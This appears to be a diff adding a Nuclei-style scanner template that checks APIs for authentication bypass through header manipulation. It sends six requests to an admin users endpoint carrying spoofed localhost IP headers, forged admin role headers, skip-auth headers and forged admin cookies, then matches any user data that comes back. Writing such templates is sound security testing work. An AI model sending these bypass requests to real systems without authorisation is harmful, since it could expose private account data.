@@ -1,0 +1,112 @@
+id: medium-api-api-authentication-bypass-header-manipulation
+
+info:
+  name: API Authentication Bypass via Header Manipulation
+  author: redteam-elite
+  severity: medium
+  description: |
+    Detects API authentication bypass vulnerabilities through header manipulation techniques
+    including X-Forwarded-For spoofing, User-Agent bypass, custom header injection,
+    and authentication header tampering to circumvent access controls.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema
+    - https://portswigger.net/web-security/authentication/other-mechanisms
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-287
+  tags: api,authentication,bypass,header,manipulation,medium
+
+http:
+  - raw:
+      - |
+        GET /api/admin/users HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 127.0.0.1
+        X-Real-IP: 127.0.0.1
+        X-Originating-IP: 127.0.0.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        GET /api/admin/users HTTP/1.1
+        Host: {{Hostname}}
+        X-Admin: true
+        X-Role: admin
+        X-User-ID: 1
+        X-Authenticated: true
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        GET /api/admin/users HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer invalid_token
+        X-Override-Auth: true
+        X-Skip-Auth: true
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        GET /api/admin/users HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Internal-Service/1.0
+        X-Internal-Request: true
+        X-Service-Auth: bypass
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        GET /api/admin/users HTTP/1.1
+        Host: {{Hostname}}
+        X-HTTP-Method-Override: OPTIONS
+        X-Requested-With: XMLHttpRequest
+        Origin: https://trusted-domain.com
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        GET /api/admin/users HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: admin=true; role=administrator; bypass=1
+        X-Cookie-Override: admin=true
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: regex
+        part: body
+        regex:
+          - '"users":\s*\['
+          - '"id":\s*\d+'
+          - '"username":\s*"[^"]+"'
+          - '"email":\s*"[^"]+"'
+          - '"role":\s*"admin"'
+          - '"permissions":\s*\['
+        condition: or
+
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - '"error":\s*"unauthorized"'
+          - '"error":\s*"access_denied"'
+          - '"error":\s*"authentication_required"'
+          - 'authentication.*failed'
+          - 'access.*forbidden'
+
+      - type: word
+        part: header
+        negative: true
+        words:
+          - "WWW-Authenticate"
+          - "X-Auth-Required: true"
+
+      - type: regex
+        part: response
+        negative: true
+        regex:
+          - 'HTTP/1\.[01] 401'
+          - 'HTTP/1\.[01] 403'
+
+    stop-at-first-match: true
